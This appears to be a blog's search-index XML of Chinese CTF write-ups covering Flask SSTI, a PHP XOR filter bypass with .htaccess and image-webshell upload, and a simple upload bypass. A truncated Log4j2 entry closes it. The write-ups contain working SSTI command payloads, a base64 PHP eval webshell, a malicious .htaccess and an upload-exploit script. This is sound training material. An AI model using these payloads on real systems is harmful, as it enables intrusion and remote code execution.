<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CISCN2019华东南赛区 Double Secret</title>
      <link href="/post/2021-12/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/"/>
      <url>/post/2021-12/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p><strong>考点：1、RC4加密    2、FlaskのSSTI</strong></p><p>进去一脸懵逼，常规流程走一套啥也没发现</p><p>然后先是看到了毫无用处的<code>robots.txt</code>，<code>dirsearch</code>扫了一遍也没扫到，在后面尝试了<code>index.php、index.jsp、index.html</code>，以自己的知识量猜测就是<code>python的flask</code>，然后就盲猜了一手<code>/secret</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so others can&#x27;t see</span><br></pre></td></tr></table></figure><p>猜测注入点是<code>secret</code>，注入后发现不明的回显，瞎输了一些东西后发现报错</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112121955519.png" alt="image-20211212194358309"></p><p>关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame </span><br></pre></td></tr></table></figure><p>将输入的内容进行了rc4解密并回显到了页面上，所以我们只需要将<code>payload</code>进行rc4加密后注入即可</p><p>加密地址：<a href="http://www.hiencode.com/rc4.html">http://www.hiencode.com/rc4.html</a></p><p>显示尝试<code>&#123;&#123;7*7&#125;&#125;</code>，回显<code>49</code>，证明存在<code>SSTI</code></p><p>接着先随便使用一个<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> 关于<code>FlaskのSSTI</code>，可以看看之前的文章<a href="https://seizer.top/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">Flask框架及其漏洞学习</a></p><blockquote><p>payload:</p><p>secret=LhQZVqUJDWds0+csvb73uyesa3qIbel8A4UHthzzDeAhhE/XBOIX20CdgvEqM/MKqq1DYiqsJn/QdgbWvEsVvd1Zp1Q=</p></blockquote><p>发现成功执行没有任何过滤，然后依次是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag.txt&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>加密后注入即可获得flag</p><p>做rc4加密的时候先是自己在网上找脚本，发现好多都用不了，最后只能找到一个大师傅的wp脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> Flask </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019 EasyWeb</title>
      <link href="/post/2021-12/%5BSUCTF%202019%5DEasyWeb/"/>
      <url>/post/2021-12/%5BSUCTF%202019%5DEasyWeb/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p><strong>考点：1、文件上传 bypass    2、.htaccess的利用</strong></p><p>开局源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第三行有个提示：</p><blockquote><p>webadmin will remove your upload file every 20 min!!!! </p><p>我的垃圾翻译：你的上传文件每20分钟将会被管理员删除</p></blockquote><p>接着我们去分析源码，一共需要绕过3层判断，分辨是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span></span><br><span class="line"><span class="comment">// 传入的值长度不能大于18</span></span><br><span class="line">preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>)</span><br><span class="line">    <span class="comment">// 正则匹配</span></span><br><span class="line">strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>)</span><br><span class="line">    <span class="comment">// 出现的字符不能超过12个</span></span><br></pre></td></tr></table></figure><p>我们先尝试绕过第二层判断，因为payload长度还没可知，18也挺长的</p><p><code>preg_match</code>的绕过在这里能想到的只有通过异或绕过（只有<code>^</code>没有被过滤，<code>~|</code>都被过滤）</p><p>关于异或绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php的eval()函数在执行时如果内部有类似&quot;abc&quot;^&quot;def&quot;的计算式，那么就先进行计算再执行。例如url?a=&#123;_GET&#125;&#123;b&#125;();&amp;b=phpinfo,也就是?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo,在传入后实际上为$&#123;????^????&#125;&#123;?&#125;();但是到了eval()函数内部就会变成$&#123;_GET&#125;&#123;?&#125;();成功执行。</span><br></pre></td></tr></table></figure><p>引用<a href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html">Hanamizuki花水木php异或计算绕过preg_match()</a></p><blockquote><p><strong>绕过原理</strong><br><strong>以制作免杀马为例:</strong><br>  在制作免杀马的过程，根据php的语言特性对字符进行!运算会将字符类型转为bool类型,而bool类型遇到运算符号时,true会自动转为数字1,false会自动转为数字0,如果将bool类型进行计算,并使用chr()函数转为字符,使用”.”进行连接,便可以绕过preg_match匹配。<br>详情了解php不同于其他语言部分<br>  但是很多的preg_match会过滤掉”.”,所以需要使用异或运算进行绕过,很多的免杀马都是这样制作的。php对字符进行异或运算是先将字符转换成ASCII码然后进行异或运算,并且php能直接对一串字符串进行异或运算,例如”123”^”abc”是”1”与”a”进行异或然后”2”与”b”进行异或,以此类推,在异或结束后就获得了想要的字符串。<br>  注意点:进行异或运算时要将数字转换成字符形式,如果数字(int)和字符异或的话,结果只会是数字,例如1^”a”=1,”a”^2=2,将数字转换成字符串可以使用trim()函数。<br>拓展:<br>php特性use of undefined constant,会将没有引号的字符都自动视为字符串,ASCII码大于0x7F的都会被当作字符串,由此可知可以简化异或过程,任何字符与0xff异或都会取相反,这样就能减少运算量了。</p></blockquote><p>从而我们构造出payload（长度刚好为18）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://de749e14-6125-4f51-9343-53a47bfa635e.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217485.png" alt="image-20211211200216819"></p><p>先查看一下<code>disable_functions</code>，发现ban了很多命令执行函数<code>system、exec</code>等</p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这里我尝试搜了一下<code>flag</code>，没想到直接就给搜出来了</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217487.png" alt="image-20211211200353334"></p><p>但是细想题目刚开始给了一个<code>get_the_flag</code>函数没有用的，出于对知识的渴望，就尝试使用其他方式解题</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>我们通过以上payload执行了<code>phpinfo()</code>，同理我们必然可以执行<code>get_the_flag</code>函数，来让我们看一看如何利用这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要绕过以下：</p><blockquote><p>文件扩展名不能有<code>ph</code></p><p><code>mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)</code>文件内容不能有<code>&lt;?</code></p><p><code>exif_imagetype()</code>判断文件头字节是否为图片类型</p></blockquote><h3 id="利用-htaccess上传文件"><a href="#利用-htaccess上传文件" class="headerlink" title="利用.htaccess上传文件"></a>利用.htaccess上传文件</h3><p>通过刚才的分析可以得知，过滤了<code>ph</code>，既不能使用<code>伪协议</code>也不能传入扩展名为<code>php</code>等php文件，第二次过滤了<code>&lt;?</code>，看别的师傅的WP说php7以上不可以使用<code>&lt;script&gt;</code>，所以只能利用<code>.htaccess</code>上传任意扩展文件达成攻击目的。</p><p>先上传最重要的<code>.htaccess</code>文件了</p><p>自己觉得挺全的学习路径：<a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a></p><p>.htaccess</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jpg&quot;</span><br></pre></td></tr></table></figure><p>通过刚才的链接学习到</p><blockquote><p>AddType application/x-httpd-php .jpg  # 将.jpg以php的方式解析<br>php_value auto_append_file  “php://filter/convert.base64-decode/resource=./1.jpg”<br>#在1.jpg加载完毕后，再次包含base64解码后的1.jpg，成功getshell，所以这也就是为什么会出现两次1.jpg内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</p></blockquote><p>还有一点要注意的是，如何绕过图片验证限制，一共有两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接在文件头加入以下：</span><br><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">或者以16进制形式在文件头加入：</span><br><span class="line">\x00</span><br></pre></td></tr></table></figure><p>原理：#注释和\x00会将这行作为无效行解析</p><p>接下来上传图片马</p><p>这里传图片马非常要注意的一点是<strong>总字节长度必须是4的倍数（保证base64解码成功）</strong>，这里被坑想了好久</p><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF98abbPD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+</span><br></pre></td></tr></table></figure><p>上面内容中<code>bb</code>就是为了凑长度的（这里千万不要换行，虽然换行符也占字节，但是实测没有效果，大概是因为不是可读字符吧）</p><p>然后依次传入文件，直接访问传入的图片马就可以了</p><p>这里再挂一个大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c387b4f3-e235-43cf-9af6-cbecb55f023c.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">padding = <span class="string">&quot;?_=$&#123;%f8%f8%f8%f8^%a7%bf%bd%ac&#125;&#123;%f8&#125;();&amp;%f8=get_the_flag&quot;</span></span><br><span class="line">myip = requests.get(<span class="string">&quot;http://ifconfig.me&quot;</span>).text</span><br><span class="line">ip_md5 = hashlib.md5(myip.encode()).hexdigest()</span><br><span class="line">userdir = <span class="string">&quot;upload/tmp_&quot;</span> + ip_md5 + <span class="string">&quot;/&quot;</span></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;\x00</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shaw.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shaw = <span class="string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span> + <span class="string">b&quot;aa&quot;</span> + base64.b64encode(</span><br><span class="line">    <span class="string">b&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span>)  <span class="comment"># 00为了满足base64算法凑足八个字节</span></span><br><span class="line"><span class="built_in">print</span>(shaw)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess, <span class="string">&#x27;image/jpeg&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url + padding, files=files)</span><br><span class="line">files = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;1.jpg&#x27;</span>, shaw, <span class="string">&#x27;image/jpeg&#x27;</span>))]</span><br><span class="line">res = requests.post(url=url + padding, files=files)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the path is:&quot;</span> + url + res.text)</span><br></pre></td></tr></table></figure><p>emm….，结果发现最终还是在<code>phpinfo</code>中找flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> .htaccess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 CV Maker</title>
      <link href="/post/2021-12/%5BWUSTCTF2020%5DCV%20Maker/"/>
      <url>/post/2021-12/%5BWUSTCTF2020%5DCV%20Maker/</url>
      
        <content type="html"><![CDATA[<h1 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h1><p><strong>考点：文件上传 bypass</strong></p><p>进入题目，一个看着非常复杂得页面</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217389.png" alt="image-20211211185811224"></p><p>通过瞎点一通或者通过查看源码，发现就只有<code>注册</code>和<code>登录</code>功能是可以用的，所以先来注册一个账号登录进去。</p><p>登录成功后发现可以上传文件，通过测试猜测是通过<code>文件头信息</code>进行过滤的，其余没有任何过滤，所以先上传一个<code>phpinfo</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217390.png" alt="image-20211211190319978"></p><p>在上传成功后，在源码中很容易得就能找到上传路径</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217391.png" alt="image-20211211190404663"></p><p>然后打开文件，查看<code>disable_functions</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217392.png" alt="image-20211211190434492"></p><p>没有ban掉任何一个函数，就是一个很简单文件上传漏洞，直接传php一句话木马，在根目录发现<code>flag</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217393.png" alt="image-20211211190551927"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j2 RCE漏洞复现</title>
      <link href="/post/2021-12/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/post/2021-12/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
